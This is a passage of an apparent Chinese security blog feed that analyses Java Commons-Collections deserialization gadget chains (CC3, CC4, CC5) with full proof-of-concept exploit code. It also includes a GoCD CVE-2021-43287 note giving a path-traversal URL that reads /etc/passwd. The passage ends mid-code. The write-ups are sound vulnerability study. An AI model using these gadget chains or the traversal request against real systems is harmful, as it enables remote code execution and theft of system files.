   <span class="type">InvocationHandler</span> <span class="variable">mapHandler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, outerMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">proxyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;, mapHandler);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> (InvocationHandler) constructor.newInstance(Override.class, proxyMap);</span><br><span class="line">        <span class="comment">// 将真正的利用链数组设置到ChainedTransformer里面的iTransformers字段值</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> ChainedTransformer.class.getDeclaredField(<span class="string">&quot;iTransformers&quot;</span>);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(chainedTransformer, transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(handler);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">CommonsCollections3利用链分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CVE 2021 43287</title>
    <link href="http://example.com/2022/11/10/CVE-2021-43287/"/>
    <id>http://example.com/2022/11/10/CVE-2021-43287/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:57:21.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2021-43287"><a href="#CVE-2021-43287" class="headerlink" title="CVE 2021 43287"></a>CVE 2021 43287</h1><blockquote><p>GoCD 一款先进的持续集成和发布管理系统,由ThoughtWorks开发。（不要和Google的编程语言Go混淆了！）其前身为CruiseControl,是ThoughtWorks在做咨询和交付交付项目时自己开发的一款开源的持续集成工具。后来随着持续集成及持续部署的火热，ThoughtWorks专门成立了一个项目组，基于Cruise开发除了Go这款工具。ThoughtWorks开源持续交付工具Go。使用Go来建立起一个项目的持续部署pipeline是非常快的，非常方便。 GoCD的v20.6.0 - v21.2.0版本存在任意文件读取漏洞，可以通过/go/add-on/business-continuity/api/plugin?folderName=&amp;pluginName=../../../etc/passwd 对文件进行读取。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v20.6.0 - v21.2.0</span><br></pre></td></tr></table></figure><h2 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621578-1249eeb8-f454-48ac-8edc-c5385a69661d.png" alt="image-20220115201323862"></p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p><img src="https://user-images.githubusercontent.com/63966847/149621580-174d710e-5900-4860-b877-6a67f115c13c.png" alt="image-20220115201231569"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><a href="https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488">https://github.com/gocd/gocd/commit/41abc210ac4e8cfa184483c9ff1c0cc04fb3511c#diff-cc02ae4dc975bd7648bbbff5f5a2d98867674a767acc35c99d4cfd4d5a6fe488</a></p><p><img src="https://user-images.githubusercontent.com/63966847/149621583-5334295f-a207-4da9-b5ad-1182bacf76d2.png" alt="image-20220115201143857"></p><p>删除了路由。</p>]]></content>
    
    
    <summary type="html">CVE 2021 43287</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections4利用链分析</title>
    <link href="http://example.com/2022/11/10/CommonsCollections4/"/>
    <id>http://example.com/2022/11/10/CommonsCollections4/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:54:19.325Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections4利用链分析"><a href="#CommonsCollections4利用链分析" class="headerlink" title="CommonsCollections4利用链分析"></a>CommonsCollections4利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>继续来看<code>CommonsCollections4</code>的链子，在<code>ysoserial</code>里的注释说明是在<code>CommonsCollections2</code>的基础上，使用<code>InstantiateTransformer</code>类替代<code>InvokerTransformer</code>类<br><img src="images/image-20221011105116866.png" alt="image-20221011105116866"></p><p>因此利用链为：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject()</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">        PriorityQueue.heapify()</span><br><span class="line">            PriorityQueue.siftDown()</span><br><span class="line">                PriorityQueue.siftDownUsingComparator()</span><br><span class="line">                    TransformingComparator.compare()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InstantiateTransformer.transform()</span><br><span class="line">                            newInstance()</span><br><span class="line">                                TrAXFilter#TrAXFilter()</span><br><span class="line">                                TemplatesImpl.newTransformer()</span><br><span class="line">                                         TemplatesImpl.getTransletInstance()</span><br><span class="line">                                         TemplatesImpl.defineTransletClasses</span><br><span class="line">                                         newInstance()</span><br><span class="line">                                            Runtime.exec()</span><br></pre></td></tr></table></figure></p><p>环境和<code>CommonsCollections2</code>一样<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 4.0</span><br><span class="line">JDK 版本暂无限制</span><br><span class="line">需要 javassist(伪条件，具体见下文)</span><br></pre></td></tr></table></figure></p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>其实到这里已经没有什么好分析的了，就是把<code>CommonsCollections2</code>中的<code>InvokerTransformer</code>替换成<code>CommonsCollections3</code>中学习到的<code>InstantiateTransformer</code>，所有知识都是前面分析过的，这里就不再赘述了，可以直接写出 POC 了<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassClassPath;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/9 10:51</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections4</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections4</span> <span class="variable">commonsCollections4</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections4</span>();</span><br><span class="line">        commonsCollections4.serialize();</span><br><span class="line">        commonsCollections4.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator.app\&quot;);&quot;</span>;</span><br><span class="line">        <span class="comment">// 创建evailClass</span></span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        pool.insertClassPath(<span class="keyword">new</span> <span class="title class_">ClassClassPath</span>(AbstractTranslet.class));</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">evailClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;evailClass&quot;</span>);</span><br><span class="line">        <span class="comment">// 将代码插进static&#123;&#125;</span></span><br><span class="line">        evailClass.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        evailClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));</span><br><span class="line">        <span class="comment">// 转换成字节码</span></span><br><span class="line">        <span class="type">byte</span>[] classBytes = evailClass.toBytecode();</span><br><span class="line">        <span class="type">byte</span>[][] targetByteCodes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;classBytes&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>,targetByteCodes);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_class&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="comment">// 利用链</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(TrAXFilter.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InstantiateTransformer</span>(</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; Templates.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; templates &#125; )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(chainedTransformer);</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        priorityQueue.add(<span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 通过反射将comparator修改为前面的链子</span></span><br><span class="line">        <span class="type">Field</span> <span class="variable">comparator</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.util.PriorityQueue&quot;</span>).getDeclaredField(<span class="string">&quot;comparator&quot;</span>);</span><br><span class="line">        comparator.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        comparator.set(priorityQueue, transformingComparator);</span><br><span class="line"></span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(priorityQueue);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 服务端</span></span><br><span class="line"><span class="comment">     *  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">// 创建并实例化文件输入流</span></span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="comment">// 创建并实例化对象输入流</span></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(<span class="keyword">final</span> Object obj, <span class="keyword">final</span> String fieldName, <span class="keyword">final</span> Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> getField(obj.getClass(), fieldName);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20221011110805910.png" alt="image-20221011110805910"></p>]]></content>
    
    
    <summary type="html">CommonsCollections4利用链分析</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>CommonsCollections5利用链分析</title>
    <link href="http://example.com/2022/11/10/CommonsCollections5/"/>
    <id>http://example.com/2022/11/10/CommonsCollections5/</id>
    <published>2022-11-09T16:18:15.000Z</published>
    <updated>2022-11-21T11:54:37.360Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CommonsCollections5-利用链分析"><a href="#CommonsCollections5-利用链分析" class="headerlink" title="CommonsCollections5 利用链分析"></a>CommonsCollections5 利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>今天接着学习<code>CommonsCollections5</code>利用链，利用环境如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CommonsCollections 3.1 - 3.2.1</span><br><span class="line">JDK 8u76之前</span><br></pre></td></tr></table></figure></p><p><code>ysoserial</code>给出的利用链如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            BadAttributeValueExpException.readObject()</span><br><span class="line">                TiedMapEntry.toString()</span><br><span class="line">                    LazyMap.get()</span><br><span class="line">                        ChainedTransformer.transform()</span><br><span class="line">                            ConstantTransformer.transform()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Class.getMethod()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.getRuntime()</span><br><span class="line">                            InvokerTransformer.transform()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    Runtime.exec()</span><br></pre></td></tr></table></figure><p>前面的<code>BadAttributeValueExpException</code>和<code>TiedMapEntry</code>倒是新知识，后面的则是前面<code>CommonsCollections1</code>的内容。看样子这条链子是找了其他能触发<code>LazyMap#get()</code>的方法。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>按照利用链跟进能触发<code>LazyMap#get()</code>方法的<code>TiedMapEntry</code>类的<code>toString()</code>方法<br><img src="images/image-20221011112752765.png" alt="image-20221011112752765"></p><p>跟进<code>getValue()</code>方法源码<br><img src="images/image-20221011112827805.png" alt="image-20221011112827805"></p><p>可以看到调用了<code>map.get()</code>方法，而<code>map</code>是通过构造方法传入的值，完全可控。接下来就是找到能触发<code>TiedMapEntry#toString()</code>方法的地方，在<code>CommonsCollections5</code>用到的是<code>BadAttributeValueExpException</code>类，跟进该类的<code>readObject()</code>方法<br><img src="images/image-20221011144219939.png" alt="image-20221011144219939"></p><p>其中<code>valObj</code>是从成员属性取的<code>val</code>，而<code>val</code>我们可以通过反射控制，因此成为可控点。并且<code>System.getSecurityManager()</code>方法默认为<code>null</code>，因此可以进入<code>else if</code>条件触发<code>valObj.toString();</code></p><p>开始编写 POC<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/11 11:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonsCollections5</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">CommonsCollections5</span> <span class="variable">commonsCollections5</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CommonsCollections5</span>();</span><br><span class="line">        commonsCollections5.serialize();</span><br><span class="line">        commonsCollections5.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 客户端</span></span><br><span class="line"><span class="comment">     * */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span>  <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 创建虚假的调用链</span></span><br><span class="line">        Transformer[] fakeTransformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="number">1</span>)&#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(fakeTransformers);</span><br><span class="line"></span><br><span class="line">        <span 